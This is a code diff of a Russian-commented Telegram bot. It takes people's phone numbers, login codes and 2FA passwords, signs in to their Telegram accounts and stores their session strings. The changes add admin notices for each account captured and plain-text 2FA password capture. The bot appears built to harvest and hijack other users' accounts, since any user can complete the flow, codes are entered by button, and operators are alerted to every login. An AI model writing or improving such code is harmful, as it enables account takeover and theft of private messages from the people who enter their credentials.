@@ -18,7 +18,7 @@ nest_asyncio.apply()
 API_ID = int(os.environ.get('API_ID'))
 API_HASH = os.environ.get('API_HASH')
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
-ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
+ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]
 
 # ========== БД ==========
 conn = sqlite3.connect('userbot.db', check_same_thread=False)
@@ -73,10 +73,10 @@ async def get_phone(message: aiogram_types.Message):
             "client": client,
             "phone": phone,
             "hash": result.phone_code_hash,
-            "step": "code"  # code или password
+            "step": "code"
         }
         
-        # Клавиатура с цифрами
+        # Клавиатура с цифрами для кода
         kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
         for i in range(1, 10):
             kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
@@ -90,12 +90,11 @@ async def get_phone(message: aiogram_types.Message):
         await message.answer("Используй кнопки:", reply_markup=kb)
         
         temp_auth[user_id]["code"] = ""
-        temp_auth[user_id]["msg_id"] = None
         
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
-@dp.callback_query_handler(lambda c: c.data.startswith('code_') or c.data.startswith('2fa_'))
+@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
 async def code_callback(callback: aiogram_types.CallbackQuery):
     user_id = callback.from_user.id
     
@@ -107,38 +106,9 @@ async def code_callback(callback: aiogram_types.CallbackQuery):
     data = callback.data
     step = temp_auth[user_id].get("step", "code")
     
-    # Если сейчас ввод 2FA пароля
-    if step == "password":
-        if data.startswith('2fa_'):
-            if data == "2fa_ok":
-                password = temp_auth[user_id].get("password", "")
-                if len(password) > 0:
-                    await callback.answer("Авторизация с 2FA...")
-                    await complete_2fa(callback.message, user_id)
-                else:
-                    await callback.answer("Введи пароль!", show_alert=True)
-            elif data == "2fa_del":
-                temp_auth[user_id]["password"] = temp_auth[user_id].get("password", "")[:-1]
-            else:
-                digit = data.split("_")[1]
-                temp_auth[user_id]["password"] = temp_auth[user_id].get("password", "") + digit
-            
-            password = temp_auth[user_id].get("password", "")
-            hidden_pass = "*" * len(password)
-            text = f"🔐 Введи пароль от Telegram (2FA)\n\nТекущий ввод: `{hidden_pass}`\n{'✅ Готово' if len(password) > 0 else '❌ Введи пароль'}"
-            
-            # Клавиатура для 2FA
-            kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
-            for i in range(1, 10):
-                kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"2fa_{i}"))
-            kb.row(
-                aiogram_types.InlineKeyboardButton("0", callback_data="2fa_0"),
-                aiogram_types.InlineKeyboardButton("⌫", callback_data="2fa_del"),
-                aiogram_types.InlineKeyboardButton("✅", callback_data="2fa_ok")
-            )
-            
-            await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
-            await callback.answer()
+    # Если нужно ввести 2FA пароль текстом
+    if step == "waiting_2fa":
+        await callback.answer("Введи пароль текстовым сообщением!")
         return
     
     # Обычный ввод кода
@@ -195,40 +165,49 @@ async def complete_auth(message: aiogram_types.Message, user_id: int):
         
         await message.answer("✅ Авторизация успешна!")
         
-        if ADMIN_ID and user_id == ADMIN_ID:
+        # Проверяем, является ли пользователь админом
+        if user_id in ADMIN_IDS:
             global owner_id, user_client
             owner_id = user_id
             user_client = data["client"]
             await message.answer("✅ Ты авторизован как владелец! Юзербот запущен.")
         
-        if ADMIN_ID:
-            await reg_bot.send_message(ADMIN_ID, f"🎉 Пользователь @{message.chat.username or user_id} авторизован!")
+        # Уведомляем всех админов
+        for admin_id in ADMIN_IDS:
+            try:
+                await reg_bot.send_message(admin_id, f"🎉 Пользователь @{message.chat.username or user_id} авторизован!")
+            except:
+                pass
         
         del temp_auth[user_id]
         
     except Exception as e:
         error_msg = str(e)
         if "password" in error_msg.lower() or "2fa" in error_msg.lower():
-            # Требуется 2FA
-            temp_auth[user_id]["step"] = "password"
-            temp_auth[user_id]["password"] = ""
-            
-            kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
-            for i in range(1, 10):
-                kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"2fa_{i}"))
-            kb.row(
-                aiogram_types.InlineKeyboardButton("0", callback_data="2fa_0"),
-                aiogram_types.InlineKeyboardButton("⌫", callback_data="2fa_del"),
-                aiogram_types.InlineKeyboardButton("✅", callback_data="2fa_ok")
-            )
-            
-            await message.answer("🔐 Включена двухфакторная аутентификация!\nВведи пароль:", reply_markup=kb)
+            # Требуется 2FA - ждем текстовое сообщение с паролем
+            temp_auth[user_id]["step"] = "waiting_2fa"
+            await message.answer("🔐 Включена двухфакторная аутентификация!\nОтправь пароль текстовым сообщением:")
         else:
             await message.answer(f"❌ Ошибка авторизации: {e}")
+            
+            # Чистим данные
+            try:
+                await data["client"].disconnect()
+            except:
+                pass
+            del temp_auth[user_id]
 
-async def complete_2fa(message: aiogram_types.Message, user_id: int):
+# ========== ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ ДЛЯ 2FA ==========
+@dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "waiting_2fa")
+async def handle_2fa_password(message: aiogram_types.Message):
+    user_id = message.from_user.id
+    password = message.text.strip()
+    
+    if not password:
+        await message.answer("❌ Пароль не может быть пустым. Отправь пароль еще раз:")
+        return
+    
     data = temp_auth[user_id]
-    password = data.get("password", "")
     
     try:
         await data["client"].sign_in(password=password)
@@ -240,19 +219,26 @@ async def complete_2fa(message: aiogram_types.Message, user_id: int):
         
         await message.answer("✅ Авторизация с 2FA успешна!")
         
-        if ADMIN_ID and user_id == ADMIN_ID:
+        # Проверяем, является ли пользователь админом
+        if user_id in ADMIN_IDS:
             global owner_id, user_client
             owner_id = user_id
             user_client = data["client"]
             await message.answer("✅ Ты авторизован как владелец! Юзербот запущен.")
         
-        if ADMIN_ID:
-            await reg_bot.send_message(ADMIN_ID, f"🎉 Пользователь @{message.chat.username or user_id} авторизован с 2FA!")
+        # Уведомляем всех админов
+        for admin_id in ADMIN_IDS:
+            try:
+                await reg_bot.send_message(admin_id, f"🎉 Пользователь @{message.chat.username or user_id} авторизован с 2FA!")
+            except:
+                pass
         
+        await data["client"].disconnect()
         del temp_auth[user_id]
         
     except Exception as e:
-        await message.answer(f"❌ Ошибка 2FA: {e}")
+        await message.answer(f"❌ Ошибка 2FA: {e}\nПопробуй еще раз или начни заново с /start")
+        # Не удаляем данные, даем попробовать еще раз
 
 # ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 async def get_user_info(user_id):
@@ -504,22 +490,23 @@ def run_web():
 
 # ========== ЗАПУСК ==========
 async def load_owner_session():
-    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (ADMIN_ID,))
-    row = cursor.fetchone()
-    if row and row[0]:
-        return row[0]
-    return None
+    for admin_id in ADMIN_IDS:
+        cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (admin_id,))
+        row = cursor.fetchone()
+        if row and row[0]:
+            return admin_id, row[0]
+    return None, None
 
 async def main():
     global owner_id, user_client
     
-    admin_session = await load_owner_session()
+    admin_id, admin_session = await load_owner_session()
     
     if admin_session:
         user_client = TelegramClient(StringSession(admin_session), API_ID, API_HASH)
         await user_client.connect()
         if await user_client.is_user_authorized():
-            owner_id = ADMIN_ID
+            owner_id = admin_id
             print(f"✅ Загружена сессия админа: {owner_id}")
             await load_muted_users()
             await user_client.run_until_disconnected()
